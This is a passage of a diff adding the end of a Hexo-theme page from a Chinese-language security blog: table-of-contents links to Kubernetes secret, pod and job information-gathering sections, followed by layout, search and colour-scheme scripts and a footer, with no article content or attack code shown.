secret信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-pod-%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="toc-text">4.2.2 pod 数据收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-3-job%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">4.2.3 job信息收集</span></a></li></ol></li></ol></li></ol>
+        
+      </div>
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+  <script>
+    (() => {
+      function compensate() {
+        const bodyBox = document.querySelector('.zoom-wrap');
+        if (bodyBox) {
+          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
+          bodyBox.style.marginBottom = `-${gapY}px`;
+        }
+
+        const catBox = document.querySelector('.catalog-zoom');
+        if (catBox) {
+          const rect = catBox.getBoundingClientRect();
+          const gapX = catBox.offsetWidth  - rect.width;
+          const gapY = catBox.offsetHeight - rect.height;
+
+          const list = catBox.querySelector('.catalog-content');
+          if (list) {
+            const orig = list.dataset.origHeight
+                      ? parseFloat(list.dataset.origHeight)
+                      : parseFloat(getComputedStyle(list).height);
+            list.dataset.origHeight = orig;
+            list.style.height       = (orig + gapY) + 'px';
+          }
+
+          catBox.style.marginRight  = `-${gapX}px`;
+          catBox.style.marginBottom = `-${gapY}px`;
+        }
+      }
+
+      function hookImages(root = document) {
+        root.querySelectorAll('img').forEach(img => {
+          if (img.dataset._scaledFix) return;
+          img.dataset._scaledFix = 1;
+          img.addEventListener('load', compensate, {once: true});
+        });
+      }
+
+      addEventListener('DOMContentLoaded', () => {
+        compensate();
+        hookImages();
+      });
+
+      addEventListener('resize', compensate);
+
+      const observer = new MutationObserver(muts => {
+        muts.forEach(m => {
+          m.addedNodes.forEach(n => {
+            if (n.nodeType !== 1) return;
+            if (n.tagName === 'IMG') hookImages(n.parentNode);
+            else hookImages(n);
+          });
+        });
+      });
+
+      const wrap = document.querySelector('.zoom-wrap');
+      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
+    })();
+  </script>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2023-2026 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
